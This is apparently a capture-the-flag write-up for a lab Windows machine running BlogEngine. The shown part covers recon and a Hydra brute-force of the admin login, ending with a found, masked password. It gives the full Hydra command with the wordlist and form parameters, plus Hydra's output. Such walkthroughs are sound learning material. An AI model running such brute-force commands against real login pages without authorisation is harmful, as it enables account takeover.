# Hack Park

Bruteforce a websites login with Hydra, identify and use a public exploit then escalate your privileges on this Windows machine!

## Initial Recon

When we visit the website we are greeted with a picture of Pennywise the Clown. Not a lot of useful information here other than the blog is running on Blog Engine.

Click the drop down menu and navigate to the login page. Using the default credentials of admin for the username and password did not work. Let's try brute force!

## Brute Force Login with Hydra

Leaving the username as admin, I ran the following command to brute force the credentials:

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.25.133 http-post-form "/Account/login.aspx?ReturnURL=admin:__VIEWSTATE=HmJiEcXuNtx1YDUbkbYzGYCH%2BShXrxVMS4%2F38RvDe6rO3SPc4Jx%2Fir59Z0SttFNtIcuMCzNWe%2FjJOY0d4LxFXLm%2F7zthwO25uu7ElzJC2gbd4to8Che6MJX7uaxdgSATqb1Wnw8pghC7qZ5swjRMP3T%2B3HFGXUhHBzRr4INjubZ21D0BQq3iu4MnHT8gMh9ckh8CHXaCeWucVvRcPtB5nbWkWUNBrgi0gZHDwaawyg1IYWzsmi1H6q%2FlKGwWlosjEN7%2BBdnQpToFZlPXhTpBk%2FvWoJe4FWmCFq0aTSPfcimPfaZkaGd4a%2F3oVFAYaOQ13s2wlWnL%2FR3vYPc2ukn5O67WIYrxc%2FYRbU9pOVJ7ZqTOaxP4&__EVENTVALIDATION=qCDC%2BGuE8nBYoyx0tAmIFExfe4R9EZBB6JLqK3MBjYxsMxNZt6iFn4dAuKnfKdh2td%2Fkm%2FODoq1lrQ7fY41Az5fVPZtjpzTQtZO%2FaAssA%2BJT64z%2FVaovdFBTy%2FsqMrbc6X2IzpDZrux5KDKJZ6UnNgM192EajKyo6QWpzhcQWv5m0v67&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed"
```

(Note: the __VIEWSTATE__ was taken from the request payload)

Hydra quickly cracked this password (omitted below):

```
[STATUS] 737.00 tries/min, 737 tries in 00:01h, 14343662 to do in 324:23h, 16 active
[80][http-post-form] host: 10.10.25.133   login: admin   password: XXXXXX
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-16 16:43:24
```
